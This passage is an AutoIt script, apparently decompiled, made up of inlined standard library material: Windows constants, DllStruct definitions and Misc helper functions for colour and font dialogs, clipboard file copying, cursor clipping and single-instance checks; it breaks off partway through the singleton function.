#NoTrayIcon
Global Const $FW_DONTCARE = 0
Global Const $FW_THIN = 100
Global Const $FW_EXTRALIGHT = 200
Global Const $FW_ULTRALIGHT = 200
Global Const $FW_LIGHT = 300
Global Const $FW_NORMAL = 400
Global Const $FW_REGULAR = 400
Global Const $FW_MEDIUM = 500
Global Const $FW_SEMIBOLD = 600
Global Const $FW_DEMIBOLD = 600
Global Const $FW_BOLD = 700
Global Const $FW_EXTRABOLD = 800
Global Const $FW_ULTRABOLD = 800
Global Const $FW_HEAVY = 900
Global Const $FW_BLACK = 900
Global Const $CF_EFFECTS = 256
Global Const $CF_PRINTERFONTS = 2
Global Const $CF_SCREENFONTS = 1
Global Const $CF_NOSCRIPTSEL = 8388608
Global Const $CF_INITTOLOGFONTSTRUCT = 64
Global Const $LOGPIXELSX = 88
Global Const $LOGPIXELSY = 90
Global Const $ANSI_CHARSET = 0
Global Const $BALTIC_CHARSET = 186
Global Const $CHINESEBIG5_CHARSET = 136
Global Const $DEFAULT_CHARSET = 1
Global Const $EASTEUROPE_CHARSET = 238
Global Const $GB2312_CHARSET = 134
Global Const $GREEK_CHARSET = 161
Global Const $HANGEUL_CHARSET = 129
Global Const $MAC_CHARSET = 77
Global Const $OEM_CHARSET = 255
Global Const $RUSSIAN_CHARSET = 204
Global Const $SHIFTJIS_CHARSET = 128
Global Const $SYMBOL_CHARSET = 2
Global Const $TURKISH_CHARSET = 162
Global Const $VIETNAMESE_CHARSET = 163
Global Const $OUT_CHARACTER_PRECIS = 2
Global Const $OUT_DEFAULT_PRECIS = 0
Global Const $OUT_DEVICE_PRECIS = 5
Global Const $OUT_OUTLINE_PRECIS = 8
Global Const $OUT_PS_ONLY_PRECIS = 10
Global Const $OUT_RASTER_PRECIS = 6
Global Const $OUT_STRING_PRECIS = 1
Global Const $OUT_STROKE_PRECIS = 3
Global Const $OUT_TT_ONLY_PRECIS = 7
Global Const $OUT_TT_PRECIS = 4
Global Const $CLIP_CHARACTER_PRECIS = 1
Global Const $CLIP_DEFAULT_PRECIS = 0
Global Const $CLIP_EMBEDDED = 128
Global Const $CLIP_LH_ANGLES = 16
Global Const $CLIP_MASK = 15
Global Const $CLIP_STROKE_PRECIS = 2
Global Const $CLIP_TT_ALWAYS = 32
Global Const $ANTIALIASED_QUALITY = 4
Global Const $DEFAULT_QUALITY = 0
Global Const $DRAFT_QUALITY = 1
Global Const $NONANTIALIASED_QUALITY = 3
Global Const $PROOF_QUALITY = 2
Global Const $DEFAULT_PITCH = 0
Global Const $FIXED_PITCH = 1
Global Const $VARIABLE_PITCH = 2
Global Const $FF_DECORATIVE = 80
Global Const $FF_DONTCARE = 0
Global Const $FF_MODERN = 48
Global Const $FF_ROMAN = 16
Global Const $FF_SCRIPT = 64
Global Const $FF_SWISS = 32
Global Const $TAGPOINT = "struct;long X;long Y;endstruct"
Global Const $TAGRECT = "struct;long Left;long Top;long Right;long Bottom;endstruct"
Global Const $TAGSIZE = "struct;long X;long Y;endstruct"
Global Const $TAGMARGINS = "int cxLeftWidth;int cxRightWidth;int cyTopHeight;int cyBottomHeight"
Global Const $TAGFILETIME = "struct;dword Lo;dword Hi;endstruct"
Global Const $TAGSYSTEMTIME = "struct;word Year;word Month;word Dow;word Day;word Hour;word Minute;word Second;word MSeconds;endstruct"
Global Const $TAGTIME_ZONE_INFORMATION = "struct;long Bias;wchar StdName[32];word StdDate[8];long StdBias;wchar DayName[32];word DayDate[8];long DayBias;endstruct"
Global Const $TAGNMHDR = "struct;hwnd hWndFrom;uint_ptr IDFrom;INT Code;endstruct"
Global Const $TAGCOMBOBOXEXITEM = "uint Mask;int_ptr Item;ptr Text;int TextMax;int Image;int SelectedImage;int OverlayImage;" & "int Indent;lparam Param"
Global Const $TAGNMCBEDRAGBEGIN = $TAGNMHDR & ";int ItemID;wchar szText[260]"
Global Const $TAGNMCBEENDEDIT = $TAGNMHDR & ";bool fChanged;int NewSelection;wchar szText[260];int Why"
Global Const $TAGNMCOMBOBOXEX = $TAGNMHDR & ";uint Mask;int_ptr Item;ptr Text;int TextMax;int Image;" & "int SelectedImage;int OverlayImage;int Indent;lparam Param"
Global Const $TAGDTPRANGE = "word MinYear;word MinMonth;word MinDOW;word MinDay;word MinHour;word MinMinute;" & "word MinSecond;word MinMSecond;word MaxYear;word MaxMonth;word MaxDOW;word MaxDay;word MaxHour;" & "word MaxMinute;word MaxSecond;word MaxMSecond;bool MinValid;bool MaxValid"
Global Const $TAGNMDATETIMECHANGE = $TAGNMHDR & ";dword Flag;" & $TAGSYSTEMTIME
Global Const $TAGNMDATETIMEFORMAT = $TAGNMHDR & ";ptr Format;" & $TAGSYSTEMTIME & ";ptr pDisplay;wchar Display[64]"
Global Const $TAGNMDATETIMEFORMATQUERY = $TAGNMHDR & ";ptr Format;struct;long SizeX;long SizeY;endstruct"
Global Const $TAGNMDATETIMEKEYDOWN = $TAGNMHDR & ";int VirtKey;ptr Format;" & $TAGSYSTEMTIME
Global Const $TAGNMDATETIMESTRING = $TAGNMHDR & ";ptr UserString;" & $TAGSYSTEMTIME & ";dword Flags"
Global Const $TAGEVENTLOGRECORD = "dword Length;dword Reserved;dword RecordNumber;dword TimeGenerated;dword TimeWritten;dword EventID;" & "word EventType;word NumStrings;word EventCategory;word ReservedFlags;dword ClosingRecordNumber;dword StringOffset;" & "dword UserSidLength;dword UserSidOffset;dword DataLength;dword DataOffset"
Global Const $TAGGDIPBITMAPDATA = "uint Width;uint Height;int Stride;int Format;ptr Scan0;uint_ptr Reserved"
Global Const $TAGGDIPENCODERPARAM = "byte GUID[16];ulong Count;ulong Type;ptr Values"
Global Const $TAGGDIPENCODERPARAMS = "uint Count;byte Params[1]"
Global Const $TAGGDIPRECTF = "float X;float Y;float Width;float Height"
Global Const $TAGGDIPSTARTUPINPUT = "uint Version;ptr Callback;bool NoThread;bool NoCodecs"
Global Const $TAGGDIPSTARTUPOUTPUT = "ptr HookProc;ptr UnhookProc"
Global Const $TAGGDIPIMAGECODECINFO = "byte CLSID[16];byte FormatID[16];ptr CodecName;ptr DllName;ptr FormatDesc;ptr FileExt;" & "ptr MimeType;dword Flags;dword Version;dword SigCount;dword SigSize;ptr SigPattern;ptr SigMask"
Global Const $TAGGDIPPENCODERPARAMS = "uint Count;byte Params[1]"
Global Const $TAGHDITEM = "uint Mask;int XY;ptr Text;handle hBMP;int TextMax;int Fmt;lparam Param;int Image;int Order;uint Type;ptr pFilter;uint State"
Global Const $TAGNMHDDISPINFO = $TAGNMHDR & ";int Item;uint Mask;ptr Text;int TextMax;int Image;lparam lParam"
Global Const $TAGNMHDFILTERBTNCLICK = $TAGNMHDR & ";int Item;" & $TAGRECT
Global Const $TAGNMHEADER = $TAGNMHDR & ";int Item;int Button;ptr pItem"
Global Const $TAGGETIPADDRESS = "byte Field4;byte Field3;byte Field2;byte Field1"
Global Const $TAGNMIPADDRESS = $TAGNMHDR & ";int Field;int Value"
Global Const $TAGLVFINDINFO = "struct;uint Flags;ptr Text;lparam Param;" & $TAGPOINT & ";uint Direction;endstruct"
Global Const $TAGLVHITTESTINFO = $TAGPOINT & ";uint Flags;int Item;int SubItem;int iGroup"
Global Const $TAGLVITEM = "struct;uint Mask;int Item;int SubItem;uint State;uint StateMask;ptr Text;int TextMax;int Image;lparam Param;" & "int Indent;int GroupID;uint Columns;ptr pColumns;ptr piColFmt;int iGroup;endstruct"
Global Const $TAGNMLISTVIEW = $TAGNMHDR & ";int Item;int SubItem;uint NewState;uint OldState;uint Changed;" & "struct;long ActionX;long ActionY;endstruct;lparam Param"
Global Const $TAGNMLVCUSTOMDRAW = "struct;" & $TAGNMHDR & ";dword dwDrawStage;handle hdc;" & $TAGRECT & ";dword_ptr dwItemSpec;uint uItemState;lparam lItemlParam;endstruct" & ";dword clrText;dword clrTextBk;int iSubItem;dword dwItemType;dword clrFace;int iIconEffect;" & "int iIconPhase;int iPartId;int iStateId;struct;long TextLeft;long TextTop;long TextRight;long TextBottom;endstruct;uint uAlign"
Global Const $TAGNMLVDISPINFO = $TAGNMHDR & ";" & $TAGLVITEM
Global Const $TAGNMLVFINDITEM = $TAGNMHDR & ";int Start;" & $TAGLVFINDINFO
Global Const $TAGNMLVGETINFOTIP = $TAGNMHDR & ";dword Flags;ptr Text;int TextMax;int Item;int SubItem;lparam lParam"
Global Const $TAGNMITEMACTIVATE = $TAGNMHDR & ";int Index;int SubItem;uint NewState;uint OldState;uint Changed;" & $TAGPOINT & ";lparam lParam;uint KeyFlags"
Global Const $TAGNMLVKEYDOWN = "align 1;" & $TAGNMHDR & ";word VKey;uint Flags"
Global Const $TAGNMLVSCROLL = $TAGNMHDR & ";int DX;int DY"
Global Const $TAGMCHITTESTINFO = "uint Size;" & $TAGPOINT & ";uint Hit;" & $TAGSYSTEMTIME & ";" & $TAGRECT & ";int iOffset;int iRow;int iCol"
Global Const $TAGMCMONTHRANGE = "word MinYear;word MinMonth;word MinDOW;word MinDay;word MinHour;word MinMinute;word MinSecond;" & "word MinMSeconds;word MaxYear;word MaxMonth;word MaxDOW;word MaxDay;word MaxHour;word MaxMinute;word MaxSecond;" & "word MaxMSeconds;short Span"
Global Const $TAGMCRANGE = "word MinYear;word MinMonth;word MinDOW;word MinDay;word MinHour;word MinMinute;word MinSecond;" & "word MinMSeconds;word MaxYear;word MaxMonth;word MaxDOW;word MaxDay;word MaxHour;word MaxMinute;word MaxSecond;" & "word MaxMSeconds;short MinSet;short MaxSet"
Global Const $TAGMCSELRANGE = "word MinYear;word MinMonth;word MinDOW;word MinDay;word MinHour;word MinMinute;word MinSecond;" & "word MinMSeconds;word MaxYear;word MaxMonth;word MaxDOW;word MaxDay;word MaxHour;word MaxMinute;word MaxSecond;" & "word MaxMSeconds"
Global Const $TAGNMDAYSTATE = $TAGNMHDR & ";" & $TAGSYSTEMTIME & ";int DayState;ptr pDayState"
Global Const $TAGNMSELCHANGE = $TAGNMHDR & ";struct;word BegYear;word BegMonth;word BegDOW;word BegDay;word BegHour;word BegMinute;word BegSecond;word BegMSeconds;endstruct;" & "struct;word EndYear;word EndMonth;word EndDOW;word EndDay;word EndHour;word EndMinute;word EndSecond;word EndMSeconds;endstruct"
Global Const $TAGNMOBJECTNOTIFY = $TAGNMHDR & ";int Item;ptr piid;ptr pObject;long Result;dword dwFlags"
Global Const $TAGNMTCKEYDOWN = "align 1;" & $TAGNMHDR & ";word VKey;uint Flags"
Global Const $TAGTVITEM = "struct;uint Mask;handle hItem;uint State;uint StateMask;ptr Text;int TextMax;int Image;int SelectedImage;" & "int Children;lparam Param;endstruct"
Global Const $TAGTVITEMEX = "struct;" & $TAGTVITEM & ";int Integral;uint uStateEx;hwnd hwnd;int iExpandedImage;int iReserved;endstruct"
Global Const $TAGNMTREEVIEW = $TAGNMHDR & ";uint Action;" & "struct;uint OldMask;handle OldhItem;uint OldState;uint OldStateMask;" & "ptr OldText;int OldTextMax;int OldImage;int OldSelectedImage;int OldChildren;lparam OldParam;endstruct;" & "struct;uint NewMask;handle NewhItem;uint NewState;uint NewStateMask;" & "ptr NewText;int NewTextMax;int NewImage;int NewSelectedImage;int NewChildren;lparam NewParam;endstruct;" & "struct;long PointX;long PointY;endstruct"
Global Const $TAGNMTVCUSTOMDRAW = "struct;" & $TAGNMHDR & ";dword DrawStage;handle HDC;" & $TAGRECT & ";dword_ptr ItemSpec;uint ItemState;lparam ItemParam;endstruct" & ";dword ClrText;dword ClrTextBk;int Level"
Global Const $TAGNMTVDISPINFO = $TAGNMHDR & ";" & $TAGTVITEM
Global Const $TAGNMTVGETINFOTIP = $TAGNMHDR & ";ptr Text;int TextMax;handle hItem;lparam lParam"
Global Const $TAGTVHITTESTINFO = $TAGPOINT & ";uint Flags;handle Item"
Global Const $TAGNMTVKEYDOWN = "align 1;" & $TAGNMHDR & ";word VKey;uint Flags"
Global Const $TAGNMMOUSE = $TAGNMHDR & ";dword_ptr ItemSpec;dword_ptr ItemData;" & $TAGPOINT & ";lparam HitInfo"
Global Const $TAGTOKEN_PRIVILEGES = "dword Count;align 4;int64 LUID;dword Attributes"
Global Const $TAGIMAGEINFO = "handle hBitmap;handle hMask;int Unused1;int Unused2;" & $TAGRECT
Global Const $TAGMENUINFO = "dword Size;INT Mask;dword Style;uint YMax;handle hBack;dword ContextHelpID;ulong_ptr MenuData"
Global Const $TAGMENUITEMINFO = "uint Size;uint Mask;uint Type;uint State;uint ID;handle SubMenu;handle BmpChecked;handle BmpUnchecked;" & "ulong_ptr ItemData;ptr TypeData;uint CCH;handle BmpItem"
Global Const $TAGREBARBANDINFO = "uint cbSize;uint fMask;uint fStyle;dword clrFore;dword clrBack;ptr lpText;uint cch;" & "int iImage;hwnd hwndChild;uint cxMinChild;uint cyMinChild;uint cx;handle hbmBack;uint wID;uint cyChild;uint cyMaxChild;" & "uint cyIntegral;uint cxIdeal;lparam lParam;uint cxHeader;" & $TAGRECT & ";uint uChevronState"
Global Const $TAGNMREBARAUTOBREAK = $TAGNMHDR & ";uint uBand;uint wID;lparam lParam;uint uMsg;uint fStyleCurrent;bool fAutoBreak"
Global Const $TAGNMRBAUTOSIZE = $TAGNMHDR & ";bool fChanged;" & "struct;long TargetLeft;long TargetTop;long TargetRight;long TargetBottom;endstruct;" & "struct;long ActualLeft;long ActualTop;long ActualRight;long ActualBottom;endstruct"
Global Const $TAGNMREBAR = $TAGNMHDR & ";dword dwMask;uint uBand;uint fStyle;uint wID;lparam lParam"
Global Const $TAGNMREBARCHEVRON = $TAGNMHDR & ";uint uBand;uint wID;lparam lParam;" & $TAGRECT & ";lparam lParamNM"
Global Const $TAGNMREBARCHILDSIZE = $TAGNMHDR & ";uint uBand;uint wID;" & "struct;long CLeft;long CTop;long CRight;long CBottom;endstruct;" & "struct;long BLeft;long BTop;long BRight;long BBottom;endstruct"
Global Const $TAGCOLORSCHEME = "dword Size;dword BtnHighlight;dword BtnShadow"
Global Const $TAGNMTOOLBAR = $TAGNMHDR & ";int iItem;" & "struct;int iBitmap;int idCommand;byte fsState;byte fsStyle;dword_ptr dwData;int_ptr iString;endstruct" & ";int cchText;ptr pszText;" & $TAGRECT
Global Const $TAGNMTBHOTITEM = $TAGNMHDR & ";int idOld;int idNew;dword dwFlags"
Global Const $TAGTBBUTTON = "int Bitmap;int Command;byte State;byte Style;align;dword_ptr Param;int_ptr String"
Global Const $TAGTBBUTTONINFO = "uint Size;dword Mask;int Command;int Image;byte State;byte Style;word CX;dword_ptr Param;ptr Text;int TextMax"
Global Const $TAGNETRESOURCE = "dword Scope;dword Type;dword DisplayType;dword Usage;ptr LocalName;ptr RemoteName;ptr Comment;ptr Provider"
Global Const $TAGOVERLAPPED = "ulong_ptr Internal;ulong_ptr InternalHigh;struct;dword Offset;dword OffsetHigh;endstruct;handle hEvent"
Global Const $TAGOPENFILENAME = "dword StructSize;hwnd hwndOwner;handle hInstance;ptr lpstrFilter;ptr lpstrCustomFilter;" & "dword nMaxCustFilter;dword nFilterIndex;ptr lpstrFile;dword nMaxFile;ptr lpstrFileTitle;dword nMaxFileTitle;" & "ptr lpstrInitialDir;ptr lpstrTitle;dword Flags;word nFileOffset;word nFileExtension;ptr lpstrDefExt;lparam lCustData;" & "ptr lpfnHook;ptr lpTemplateName;ptr pvReserved;dword dwReserved;dword FlagsEx"
Global Const $TAGBITMAPINFO = "struct;dword Size;long Width;long Height;word Planes;word BitCount;dword Compression;dword SizeImage;" & "long XPelsPerMeter;long YPelsPerMeter;dword ClrUsed;dword ClrImportant;endstruct;dword RGBQuad"
Global Const $TAGBLENDFUNCTION = "byte Op;byte Flags;byte Alpha;byte Format"
Global Const $TAGGUID = "ulong Data1;ushort Data2;ushort Data3;byte Data4[8]"
Global Const $TAGWINDOWPLACEMENT = "uint length;uint flags;uint showCmd;long ptMinPosition[2];long ptMaxPosition[2];long rcNormalPosition[4]"
Global Const $TAGWINDOWPOS = "hwnd hWnd;hwnd InsertAfter;int X;int Y;int CX;int CY;uint Flags"
Global Const $TAGSCROLLINFO = "uint cbSize;uint fMask;int nMin;int nMax;uint nPage;int nPos;int nTrackPos"
Global Const $TAGSCROLLBARINFO = "dword cbSize;" & $TAGRECT & ";int dxyLineButton;int xyThumbTop;" & "int xyThumbBottom;int reserved;dword rgstate[6]"
Global Const $TAGLOGFONT = "long Height;long Width;long Escapement;long Orientation;long Weight;byte Italic;byte Underline;" & "byte Strikeout;byte CharSet;byte OutPrecision;byte ClipPrecision;byte Quality;byte PitchAndFamily;wchar FaceName[32]"
Global Const $TAGKBDLLHOOKSTRUCT = "dword vkCode;dword scanCode;dword flags;dword time;ulong_ptr dwExtraInfo"
Global Const $TAGPROCESS_INFORMATION = "handle hProcess;handle hThread;dword ProcessID;dword ThreadID"
Global Const $TAGSTARTUPINFO = "dword Size;ptr Reserved1;ptr Desktop;ptr Title;dword X;dword Y;dword XSize;dword YSize;dword XCountChars;" & "dword YCountChars;dword FillAttribute;dword Flags;word ShowWindow;word Reserved2;ptr Reserved3;handle StdInput;" & "handle StdOutput;handle StdError"
Global Const $TAGSECURITY_ATTRIBUTES = "dword Length;ptr Descriptor;bool InheritHandle"
Global Const $TAGWIN32_FIND_DATA = "dword dwFileAttributes;dword ftCreationTime[2];dword ftLastAccessTime[2];dword ftLastWriteTime[2];dword nFileSizeHigh;dword nFileSizeLow;dword dwReserved0;dword dwReserved1;wchar cFileName[260];wchar cAlternateFileName[14]"
Global Const $TAGTEXTMETRIC = "long tmHeight;long tmAscent;long tmDescent;long tmInternalLeading;long tmExternalLeading;" & "long tmAveCharWidth;long tmMaxCharWidth;long tmWeight;long tmOverhang;long tmDigitizedAspectX;long tmDigitizedAspectY;" & "wchar tmFirstChar;wchar tmLastChar;wchar tmDefaultChar;wchar tmBreakChar;byte tmItalic;byte tmUnderlined;byte tmStruckOut;" & "byte tmPitchAndFamily;byte tmCharSet"
Func _WINAPI_GETLASTERROR ( $CURERR = @error , $CUREXT = @extended )
	Local $ARESULT = DllCall ( "kernel32.dll" , "dword" , "GetLastError" )
	Return SetError ( $CURERR , $CUREXT , $ARESULT [ 0 ] )
EndFunc
Func _WINAPI_SETLASTERROR ( $IERRCODE , $CURERR = @error , $CUREXT = @extended )
	DllCall ( "kernel32.dll" , "none" , "SetLastError" , "dword" , $IERRCODE )
	Return SetError ( $CURERR , $CUREXT )
EndFunc
Global Const $__MISCCONSTANT_CC_ANYCOLOR = 256
Global Const $__MISCCONSTANT_CC_FULLOPEN = 2
Global Const $__MISCCONSTANT_CC_RGBINIT = 1
Global Const $TAGCHOOSECOLOR = "dword Size;hwnd hWndOwnder;handle hInstance;dword rgbResult;ptr CustColors;dword Flags;lparam lCustData;" & "ptr lpfnHook;ptr lpTemplateName"
Global Const $TAGCHOOSEFONT = "dword Size;hwnd hWndOwner;handle hDC;ptr LogFont;int PointSize;dword Flags;dword rgbColors;lparam CustData;" & "ptr fnHook;ptr TemplateName;handle hInstance;ptr szStyle;word FontType;int SizeMin;int SizeMax"
Func _CHOOSECOLOR ( $IRETURNTYPE = 0 , $ICOLORREF = 0 , $IREFTYPE = 0 , $HWNDOWNDER = 0 )
	Local $CUSTCOLORS = "dword[16]"
	Local $TCHOOSE = DllStructCreate ( $TAGCHOOSECOLOR )
	Local $TCC = DllStructCreate ( $CUSTCOLORS )
	If $IREFTYPE = 1 Then
		$ICOLORREF = Int ( $ICOLORREF )
	ElseIf $IREFTYPE = 2 Then
		$ICOLORREF = Hex ( String ( $ICOLORREF ) , 6 )
		$ICOLORREF = "0x" & StringMid ( $ICOLORREF , 5 , 2 ) & StringMid ( $ICOLORREF , 3 , 2 ) & StringMid ( $ICOLORREF , 1 , 2 )
	EndIf
	DllStructSetData ( $TCHOOSE , "Size" , DllStructGetSize ( $TCHOOSE ) )
	DllStructSetData ( $TCHOOSE , "hWndOwnder" , $HWNDOWNDER )
	DllStructSetData ( $TCHOOSE , "rgbResult" , $ICOLORREF )
	DllStructSetData ( $TCHOOSE , "CustColors" , DllStructGetPtr ( $TCC ) )
	DllStructSetData ( $TCHOOSE , "Flags" , BitOR ( $__MISCCONSTANT_CC_ANYCOLOR , $__MISCCONSTANT_CC_FULLOPEN , $__MISCCONSTANT_CC_RGBINIT ) )
	Local $ARESULT = DllCall ( "comdlg32.dll" , "bool" , "ChooseColor" , "struct*" , $TCHOOSE )
	If @error Then Return SetError ( @error , @extended , - 1 )
	If $ARESULT [ 0 ] = 0 Then Return SetError ( - 3 , - 3 , - 1 )
	Local $COLOR_PICKED = DllStructGetData ( $TCHOOSE , "rgbResult" )
	If $IRETURNTYPE = 1 Then
		Return "0x" & Hex ( String ( $COLOR_PICKED ) , 6 )
	ElseIf $IRETURNTYPE = 2 Then
		$COLOR_PICKED = Hex ( String ( $COLOR_PICKED ) , 6 )
		Return "0x" & StringMid ( $COLOR_PICKED , 5 , 2 ) & StringMid ( $COLOR_PICKED , 3 , 2 ) & StringMid ( $COLOR_PICKED , 1 , 2 )
	ElseIf $IRETURNTYPE = 0 Then
		Return $COLOR_PICKED
	Else
		Return SetError ( - 4 , - 4 , - 1 )
	EndIf
EndFunc
Func _CHOOSEFONT ( $SFONTNAME = "Courier New" , $IPOINTSIZE = 10 , $ICOLORREF = 0 , $IFONTWEIGHT = 0 , $IITALIC = False , $IUNDERLINE = False , $ISTRIKETHRU = False , $HWNDOWNER = 0 )
	Local $ITALIC = 0 , $UNDERLINE = 0 , $STRIKEOUT = 0
	Local $LNGDC = __MISC_GETDC ( 0 )
	Local $LFHEIGHT = Round ( ( $IPOINTSIZE * __MISC_GETDEVICECAPS ( $LNGDC , $LOGPIXELSX ) ) / 72 , 0 )
	__MISC_RELEASEDC ( 0 , $LNGDC )
	Local $TCHOOSEFONT = DllStructCreate ( $TAGCHOOSEFONT )
	Local $TLOGFONT = DllStructCreate ( $TAGLOGFONT )
	DllStructSetData ( $TCHOOSEFONT , "Size" , DllStructGetSize ( $TCHOOSEFONT ) )
	DllStructSetData ( $TCHOOSEFONT , "hWndOwner" , $HWNDOWNER )
	DllStructSetData ( $TCHOOSEFONT , "LogFont" , DllStructGetPtr ( $TLOGFONT ) )
	DllStructSetData ( $TCHOOSEFONT , "PointSize" , $IPOINTSIZE )
	DllStructSetData ( $TCHOOSEFONT , "Flags" , BitOR ( $CF_SCREENFONTS , $CF_PRINTERFONTS , $CF_EFFECTS , $CF_INITTOLOGFONTSTRUCT , $CF_NOSCRIPTSEL ) )
	DllStructSetData ( $TCHOOSEFONT , "rgbColors" , $ICOLORREF )
	DllStructSetData ( $TCHOOSEFONT , "FontType" , 0 )
	DllStructSetData ( $TLOGFONT , "Height" , $LFHEIGHT )
	DllStructSetData ( $TLOGFONT , "Weight" , $IFONTWEIGHT )
	DllStructSetData ( $TLOGFONT , "Italic" , $IITALIC )
	DllStructSetData ( $TLOGFONT , "Underline" , $IUNDERLINE )
	DllStructSetData ( $TLOGFONT , "Strikeout" , $ISTRIKETHRU )
	DllStructSetData ( $TLOGFONT , "FaceName" , $SFONTNAME )
	Local $ARESULT = DllCall ( "comdlg32.dll" , "bool" , "ChooseFontW" , "struct*" , $TCHOOSEFONT )
	If @error Then Return SetError ( @error , @extended , - 1 )
	If $ARESULT [ 0 ] = 0 Then Return SetError ( - 3 , - 3 , - 1 )
	Local $FONTNAME = DllStructGetData ( $TLOGFONT , "FaceName" )
	If StringLen ( $FONTNAME ) = 0 And StringLen ( $SFONTNAME ) > 0 Then $FONTNAME = $SFONTNAME
	If DllStructGetData ( $TLOGFONT , "Italic" ) Then $ITALIC = 2
	If DllStructGetData ( $TLOGFONT , "Underline" ) Then $UNDERLINE = 4
	If DllStructGetData ( $TLOGFONT , "Strikeout" ) Then $STRIKEOUT = 8
	Local $ATTRIBUTES = BitOR ( $ITALIC , $UNDERLINE , $STRIKEOUT )
	Local $SIZE = DllStructGetData ( $TCHOOSEFONT , "PointSize" ) / 10
	Local $COLORREF = DllStructGetData ( $TCHOOSEFONT , "rgbColors" )
	Local $WEIGHT = DllStructGetData ( $TLOGFONT , "Weight" )
	Local $COLOR_PICKED = Hex ( String ( $COLORREF ) , 6 )
	Return StringSplit ( $ATTRIBUTES & "," & $FONTNAME & "," & $SIZE & "," & $WEIGHT & "," & $COLORREF & "," & "0x" & $COLOR_PICKED & "," & "0x" & StringMid ( $COLOR_PICKED , 5 , 2 ) & StringMid ( $COLOR_PICKED , 3 , 2 ) & StringMid ( $COLOR_PICKED , 1 , 2 ) , "," )
EndFunc
Func _CLIPPUTFILE ( $SFILE , $SSEPARATOR = "|" )
	Local Const $GMEM_MOVEABLE = 2 , $CF_HDROP = 15
	$SFILE &= $SSEPARATOR & $SSEPARATOR
	Local $NGLOBMEMSIZE = 2 * ( StringLen ( $SFILE ) + 20 )
	Local $ARESULT = DllCall ( "user32.dll" , "bool" , "OpenClipboard" , "hwnd" , 0 )
	If @error Or $ARESULT [ 0 ] = 0 Then Return SetError ( 1 , _WINAPI_GETLASTERROR ( ) , False )
	Local $IERROR = 0 , $ILASTERROR = 0
	$ARESULT = DllCall ( "user32.dll" , "bool" , "EmptyClipboard" )
	If @error Or Not $ARESULT [ 0 ] Then
		$IERROR = 2
		$ILASTERROR = _WINAPI_GETLASTERROR ( )
	Else
		$ARESULT = DllCall ( "kernel32.dll" , "handle" , "GlobalAlloc" , "uint" , $GMEM_MOVEABLE , "ulong_ptr" , $NGLOBMEMSIZE )
		If @error Or Not $ARESULT [ 0 ] Then
			$IERROR = 3
			$ILASTERROR = _WINAPI_GETLASTERROR ( )
		Else
			Local $HGLOBAL = $ARESULT [ 0 ]
			$ARESULT = DllCall ( "kernel32.dll" , "ptr" , "GlobalLock" , "handle" , $HGLOBAL )
			If @error Or Not $ARESULT [ 0 ] Then
				$IERROR = 4
				$ILASTERROR = _WINAPI_GETLASTERROR ( )
			Else
				Local $HLOCK = $ARESULT [ 0 ]
				Local $DROPFILES = DllStructCreate ( "dword pFiles;" & $TAGPOINT & ";bool fNC;bool fWide;wchar[" & StringLen ( $SFILE ) + 1 & "]" , $HLOCK )
				If @error Then Return SetError ( 5 , 6 , False )
				Local $TEMPSTRUCT = DllStructCreate ( "dword;long;long;bool;bool" )
				DllStructSetData ( $DROPFILES , "pFiles" , DllStructGetSize ( $TEMPSTRUCT ) )
				DllStructSetData ( $DROPFILES , "X" , 0 )
				DllStructSetData ( $DROPFILES , "Y" , 0 )
				DllStructSetData ( $DROPFILES , "fNC" , 0 )
				DllStructSetData ( $DROPFILES , "fWide" , 1 )
				DllStructSetData ( $DROPFILES , 6 , $SFILE )
				For $I = 1 To StringLen ( $SFILE )
					If DllStructGetData ( $DROPFILES , 6 , $I ) = $SSEPARATOR Then DllStructSetData ( $DROPFILES , 6 , Chr ( 0 ) , $I )
				Next
				$ARESULT = DllCall ( "user32.dll" , "handle" , "SetClipboardData" , "uint" , $CF_HDROP , "handle" , $HGLOBAL )
				If @error Or Not $ARESULT [ 0 ] Then
					$IERROR = 6
					$ILASTERROR = _WINAPI_GETLASTERROR ( )
				EndIf
				$ARESULT = DllCall ( "kernel32.dll" , "bool" , "GlobalUnlock" , "handle" , $HGLOBAL )
				If ( @error Or Not $ARESULT [ 0 ] ) And Not $IERROR And _WINAPI_GETLASTERROR ( ) Then
					$IERROR = 8
					$ILASTERROR = _WINAPI_GETLASTERROR ( )
				EndIf
			EndIf
			$ARESULT = DllCall ( "kernel32.dll" , "ptr" , "GlobalFree" , "handle" , $HGLOBAL )
			If ( @error Or $ARESULT [ 0 ] ) And Not $IERROR Then
				$IERROR = 9
				$ILASTERROR = _WINAPI_GETLASTERROR ( )
			EndIf
		EndIf
	EndIf
	$ARESULT = DllCall ( "user32.dll" , "bool" , "CloseClipboard" )
	If ( @error Or Not $ARESULT [ 0 ] ) And Not $IERROR Then Return SetError ( 7 , _WINAPI_GETLASTERROR ( ) , False )
	If $IERROR Then Return SetError ( $IERROR , $ILASTERROR , False )
	Return True
EndFunc
Func _IIF ( $FTEST , $VTRUEVAL , $VFALSEVAL )
	If $FTEST Then
		Return $VTRUEVAL
	Else
		Return $VFALSEVAL
	EndIf
EndFunc
Func _MOUSETRAP ( $ILEFT = 0 , $ITOP = 0 , $IRIGHT = 0 , $IBOTTOM = 0 )
	Local $ARESULT
	If @NumParams == 0 Then
		$ARESULT = DllCall ( "user32.dll" , "bool" , "ClipCursor" , "ptr" , 0 )
		If @error Or Not $ARESULT [ 0 ] Then Return SetError ( 1 , _WINAPI_GETLASTERROR ( ) , False )
	Else
		If @NumParams == 2 Then
			$IRIGHT = $ILEFT + 1
			$IBOTTOM = $ITOP + 1
		EndIf
		Local $TRECT = DllStructCreate ( $TAGRECT )
		DllStructSetData ( $TRECT , "Left" , $ILEFT )
		DllStructSetData ( $TRECT , "Top" , $ITOP )
		DllStructSetData ( $TRECT , "Right" , $IRIGHT )
		DllStructSetData ( $TRECT , "Bottom" , $IBOTTOM )
		$ARESULT = DllCall ( "user32.dll" , "bool" , "ClipCursor" , "struct*" , $TRECT )
		If @error Or Not $ARESULT [ 0 ] Then Return SetError ( 2 , _WINAPI_GETLASTERROR ( ) , False )
	EndIf
	Return True
EndFunc
Func _SINGLETON ( $SOCCURENCENAME , $IFLAG = 0 )
	Local Const $ERROR_ALREADY_EXISTS = 183
	Local Const $SECURITY_DESCRIPTOR_REVISION = 1
	Local $TSECURITYATTRIBUTES = 0
	If BitAND ( $IFLAG , 2 ) Then
		Local $TSECURITYDESCRIPTOR = DllStructCreate ( "byte;byte;word;ptr[4]" )
		Local $ARET = DllCall ( "advapi32.dll" , "bool" , "InitializeSecurityDescriptor" , "struct*" , $TSECURITYDESCRIPTOR , "dword" , $SECURITY_DESCRIPTOR_REVISION )
		If @error Then Return SetError ( @error , @extended , 0 )
		If $ARET [ 0 ] Then
